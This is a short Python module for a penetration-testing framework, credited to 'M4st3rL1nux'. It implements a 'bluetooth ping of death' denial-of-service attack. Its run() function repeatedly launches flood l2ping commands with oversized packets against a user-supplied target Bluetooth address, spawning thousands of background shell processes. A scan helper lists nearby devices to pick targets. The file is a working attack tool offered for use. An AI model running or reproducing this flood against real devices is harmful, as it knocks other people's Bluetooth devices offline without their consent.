#        Copyright (C) M4st3r L1nux Indonesia (Jh0n 1sl4nskh4_404)

from core.GarudaTools import *
import os
import subprocess
import time

conf = {
	"name": "bluetooth_pod",
	"version": "1.0",
	"shortdesc": "bluetooth ping of death",
	"github": "JhonIslanskha",
	"author": "M4st3rL1nux",
	"by": "Jh0n 1sl4nskh4_404",
	"initdate": "24.2.2016",
	"lastmod": "26.5.2017",
	"apisupport": False,
	"needroot": 1,
	"dependencies": ["xterm", "hcitool", "l2ping"]

}


# List of variables
variables = OrderedDict((
	('interface', ['hci0', 'interface']),
	('bdaddr', ['none', 'target bluetooth address']),
	('size', ['600', 'size of packets (default 600)']),
))

# Custom commands
customcommands = {
	'scan': 'scan for devices'
}

# Simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	printInfo("bluetooth ping of death attack started...")
	try:
		for i in range(1, 10000):
			xterm_1 = "l2ping -i %s -s %s -f %s &" % (variables['interface'][0], variables['size'][0], variables['bdaddr'][0])
			subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			time.sleep(3)
	except(OSError):
		printError("something went wrong!")


def scan(args):
	os.system("hcitool scan")